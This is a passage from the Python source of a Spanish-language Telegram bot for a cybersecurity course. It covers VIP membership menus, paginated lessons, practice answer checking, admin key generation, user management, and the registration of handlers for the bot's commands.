            if user_data.get("vip") and user_data.get("vip_expiry"):
                expiry_date_str = user_data["vip_expiry"]
                if "9999" in expiry_date_str: status_text = "✅ <b>ACTIVO (Vitalicio)</b>"
                else:
                    try:
                        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d %H:%M:%S")
                        status_text = f"✅ <b>ACTIVO</b> (Expira: {expiry_date.strftime('%d/%m/%Y')})"
                    except (ValueError, TypeError): status_text = "❌ ESTADO INVÁLIDO"
            vip_text = f"⭐ <b>Membresía VIP</b> ⭐\n\nTu estado: {status_text}\n\n<b>Planes:</b>\n"
            for _, plan_info in VIP_PLANS.items(): vip_text += f"- <b>{plan_info['name']}</b>: ${plan_info['price']} USD\n"
            vip_text += f"\nContacta al admin para adquirir: 👉 <b>{ADMIN_USERNAME}</b> 👈"
            keyboard = [[InlineKeyboardButton("🔙 Volver", callback_data="menu:main")]]
            await query.message.edit_text(vip_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
        elif sub_command == 'redeem':
            await query.message.edit_text("🔑 Usa el comando en el chat:\n<code>/redeem TU-CLAVE-AQUI</code>", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="menu:main")]]))
    
    elif command == 'level':
        db = get_db()
        content_hub, course_structure = db.get('content', {}), db.get('course_structure', {})
        level_id, page = parts[1], int(parts[2])
        level_info = course_structure.get(level_id, {})
        all_lessons = level_info.get('lessons', [])
        if not all_lessons: return await query.message.edit_text("Módulo sin lecciones.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="menu:course")]]))
        total_pages = math.ceil(len(all_lessons) / PRACTICES_PER_PAGE)
        start_index, end_index = page * PRACTICES_PER_PAGE, (page + 1) * PRACTICES_PER_PAGE
        lessons_to_show = all_lessons[start_index:end_index]
        text = f"📘 <b>{level_info.get('name', '')}</b> (Pág {page + 1}/{total_pages})\n\n"
        keyboard, user_progress = [], user_data.get('progress', {}).get(level_id, [])
        for i, lesson_id in enumerate(lessons_to_show):
            lesson_index_global = start_index + i
            content = content_hub.get(lesson_id, {})
            if not content: continue
            is_completed = lesson_id in user_progress
            is_unlocked = (lesson_index_global == 0) or (lesson_index_global > 0 and all_lessons[lesson_index_global - 1] in user_progress) or is_admin
            has_access = is_lesson_free(lesson_id) or user_data.get("vip", False) or is_admin
            status_icon = "✅" if is_completed else ("🟢" if is_unlocked and has_access else "🔒")
            button_text = f"{status_icon} {content['title']}"
            if not has_access and is_unlocked: button_text += " (VIP)"
            if is_unlocked and has_access:
                keyboard.append([InlineKeyboardButton(button_text, callback_data=f"practice:{level_id}:{lesson_id}:{page}")])
            else:
                keyboard.append([InlineKeyboardButton(button_text, callback_data="noop_vip" if not has_access else "noop")])
        nav_buttons = []
        if page > 0: nav_buttons.append(InlineKeyboardButton("⬅️ Anterior", callback_data=f"level:{level_id}:{page-1}"))
        if end_index < len(all_lessons): nav_buttons.append(InlineKeyboardButton("Siguiente ➡️", callback_data=f"level:{level_id}:{page+1}"))
        if nav_buttons: keyboard.append(nav_buttons)
        keyboard.append([InlineKeyboardButton("🔙 Ruta", callback_data="menu:course")])
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)

    elif command == 'practice':
        db = get_db()
        content = db.get('content', {})
        level_id, lesson_id, page = parts[1], parts[2], int(parts[3])
        lesson = content.get(lesson_id)
        if not lesson: return await query.message.edit_text("❌ Lección no encontrada.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data=f"level:{level_id}:{page}")]]))
        context.user_data['current_practice'] = {'level_id': level_id, 'lesson_id': lesson_id, 'page': page}
        text = (f"📗 <b>{lesson['title']}</b>\n\n<b>Teoría:</b>\n{lesson['theory']}\n\n{lesson['practice']}\n\n<i>Responde aquí. /cancel para salir.</i>")
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data=f"level:{level_id}:{page}")]])
        await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return AWAITING_PRACTICE_ANSWER
    
    elif command == 'admin':
        if not is_admin: return
        sub_command = parts[1]
        if sub_command == 'maintenance':
            db = get_db(); db['bot_state']['maintenance_mode'] = not db['bot_state'].get('maintenance_mode', False); save_db(db)
            await _display_admin_panel(update, context)
        elif sub_command == 'botstats': await _display_botstats(update, context)
        elif sub_command == 'panel': await _display_admin_panel(update, context)
        elif sub_command == 'genkey':
            plans_kb = [[InlineKeyboardButton(plan['name'], callback_data=f"admin:genkey_create:{plan_name}")] for plan_name, plan in VIP_PLANS.items()]
            plans_kb.append([InlineKeyboardButton("🔙 Volver", callback_data="admin:panel")])
            await query.message.edit_text("Elige un plan para generar <b>1 clave</b>:", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(plans_kb))
        elif sub_command == 'genkey_create':
            plan = parts[2]
            if plan not in VIP_PLANS: return
            db, key = get_db(), 'CH-' + ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZ23456789', k=16))
            db['keys'][key] = {"days": VIP_PLANS[plan]['days'], "used": False, "created": datetime.now().strftime("%Y-%m-%d")}
            save_db(db)
            text = f"✅ Clave generada ({plan}):\n\n<code>{key}</code>"
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("➕ Generar otra", callback_data="admin:genkey")], [InlineKeyboardButton("🔙 Panel", callback_data="admin:panel")]])
            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    
    elif command == 'admin_action':
        if not is_admin: return
        action, managed_user_id_str = parts[1], parts[2]
        managed_user_id = int(managed_user_id_str)
        db = get_db()
        managed_user_data = db['users'][managed_user_id_str]
        if action == 'vip':
            if managed_user_data.get("vip"): managed_user_data["vip"], managed_user_data["vip_expiry"] = False, None; await query.answer("✅ VIP revocado.", show_alert=True)
            else:
                expiry = datetime.now() + timedelta(days=30)
                managed_user_data["vip"], managed_user_data["vip_expiry"] = True, expiry.strftime("%Y-%m-%d %H:%M:%S")
                await query.answer("✅ VIP otorgado por 30 días.", show_alert=True)
        elif action == 'ban':
            managed_user_data["banned"] = not managed_user_data.get("banned", False)
            status = "Baneado" if managed_user_data["banned"] else "Desbaneado"
            await query.answer(f"✅ Usuario {status}.", show_alert=True)
        save_db(db)
        await show_user_management_panel(update, context, managed_user_id)

    elif command == 'noop': await query.answer("🔒 Módulo o práctica bloqueada. Completa los anteriores.", show_alert=True)
    elif command == 'noop_vip': await query.answer("⭐ ¡Contenido exclusivo para VIP!", show_alert=True)

# --- Manejador de Prácticas ---
async def handle_practice_answer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_answer = update.message.text
    user_id_str = str(update.effective_user.id)
    practice_info = context.user_data.get('current_practice')
    if not practice_info: return ConversationHandler.END

    db = get_db()
    level_id, lesson_id = practice_info['level_id'], practice_info['lesson_id']
    content = db.get('content', {})
    correct_answer_keywords = content.get(lesson_id, {}).get('answer', [])
    
    if check_flexible_answer(user_answer, correct_answer_keywords):
        user_progress = db["users"][user_id_str].get('progress', {})
        level_progress = user_progress.setdefault(level_id, [])
        reply_text = "✅ ¡Correcto! "
        if lesson_id not in level_progress:
            level_progress.append(lesson_id)
            db["users"][user_id_str]['points'] = db["users"][user_id_str].get('points', 0) + POINTS_PER_PRACTICE
            reply_text += f"Has ganado <b>{POINTS_PER_PRACTICE} puntos</b>."
        else:
            reply_text += "Ya habías resuelto esta práctica."
        save_db(db)
        await update.message.reply_html(reply_text)
        
        all_lessons = db.get('course_structure', {}).get(level_id, {}).get('lessons', [])
        current_page = practice_info.get('page', 0)
        
        context.user_data.pop('current_practice', None)
        
        query_mock = type('Query', (), {'message': update.message, 'data': f'level:{level_id}:{current_page}', 'from_user': update.effective_user, 'answer': lambda show_alert=False: None})()
        update_mock = type('Update', (), {'callback_query': query_mock, 'message': update.message})
        await button_handler(update_mock, context)
        return ConversationHandler.END
    else:
        await update.message.reply_text("❌ Respuesta incorrecta. Vuelve a intentarlo. /cancel para salir.")
        return AWAITING_PRACTICE_ANSWER
        
# --- Función Principal ---
def main():
    if not TOKEN:
        logger.critical("¡Error Crítico! El TOKEN del bot no está configurado en el archivo configs.env")
        return
    if not ADMIN_ID:
        logger.warning("Advertencia: El ADMIN_ID no está configurado.")
    
    app = Application.builder().token(TOKEN).build()
    admin_filter = filters.User(user_id=ADMIN_ID)

    # --- Conversation Handlers ---
    feedback_handler = ConversationHandler(
        entry_points=[CommandHandler("feedback", feedback_start_command), CallbackQueryHandler(feedback_start_command, pattern='^menu:feedback$')],
        states={AWAITING_FEEDBACK: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_feedback)]},
        fallbacks=[CommandHandler('cancel', cancel_conversation_generic)]
    )
    practice_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern='^practice:.*')],
        states={AWAITING_PRACTICE_ANSWER: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_practice_answer)]},
        fallbacks=[CommandHandler('cancel', cancel_conversation_generic)]
    )
    add_lesson_handler = ConversationHandler(
        entry_points=[CommandHandler('add_lesson', add_lesson_start_command, filters=admin_filter), CallbackQueryHandler(add_lesson_start_command, pattern='^admin:add_lesson$')],
        states={
            ADD_LESSON_LEVEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_lesson_level)],
            ADD_LESSON_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_lesson_id)],
            ADD_LESSON_TITLE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_lesson_title)],
            ADD_LESSON_THEORY: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_lesson_theory)],
            ADD_LESSON_PRACTICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_lesson_practice)],
            ADD_LESSON_ANSWER: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_lesson_answer)],
        },
        fallbacks=[CommandHandler('cancel', cancel_conversation_generic)]
    )
    set_ctf_handler = ConversationHandler(
        entry_points=[CommandHandler('set_ctf', set_ctf_start_command, filters=admin_filter), CallbackQueryHandler(set_ctf_start_command, pattern='^admin:set_ctf$')],
        states={
            SET_CTF_PRACTICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ctf_practice)],
            SET_CTF_ANSWER: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ctf_answer)],
        },
        fallbacks=[CommandHandler('cancel', cancel_conversation_generic)]
    )
    manage_user_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(manage_user_start_command, pattern='^admin:manage_user$')],
        states={RECEIVE_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_user_id)]},
        fallbacks=[CommandHandler('cancel', cancel_conversation_generic)]
    )
    broadcast_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(broadcast_start_command, pattern='^admin:broadcast$')],
        states={RECEIVE_BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_broadcast_message)]},
        fallbacks=[CommandHandler('cancel', cancel_conversation_generic)]
    )

    # --- Handlers ---
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("profile", profile_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("leaderboard", leaderboard_command))
    app.add_handler(CommandHandler("daily_ctf", daily_ctf_command))
    app.add_handler(CommandHandler("solve", solve_ctf_command))
    app.add_handler(CommandHandler("random", random_lesson_command))
    app.add_handler(CommandHandler("base64", base64_command))
    app.add_handler(CommandHandler("hash", hash_command))
    app.add_handler(CommandHandler("url", url_command))
    app.add_handler(CommandHandler("dns", dns_command))
    app.add_handler(CommandHandler("cve", cve_command))
    app.add_handler(CommandHandler("whois", whois_command))
    app.add_handler(CommandHandler("subdomains", subdomains_command))
    app.add_handler(CommandHandler("httpheaders", httpheaders_command))
    app.add_handler(CommandHandler("portscan", portscan_command))
    app.add_handler(CommandHandler("jwt_decode", jwt_decode_command))
    
    app.add_handler(CommandHandler("admin", admin_command, filters=admin_filter))
    app.add_handler(CommandHandler("key", key_command, filters=admin_filter))
    app.add_handler(CommandHandler("maintenance", maintenance_command, filters=admin_filter))
    app.add_handler(CommandHandler("botstats", botstats_command, filters=admin_filter))
    
    app.add_handler(feedback_handler)
    app.add_handler(practice_handler)
    app.add_handler(add_lesson_handler)
    app.add_handler(set_ctf_handler)
    app.add_handler(manage_user_handler)
    app.add_handler(broadcast_handler)
    
    app.add_handler(CallbackQueryHandler(button_handler))

    logger.info("Iniciando CyberHub Academy Bot v35.0 - Edición Monolítica...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()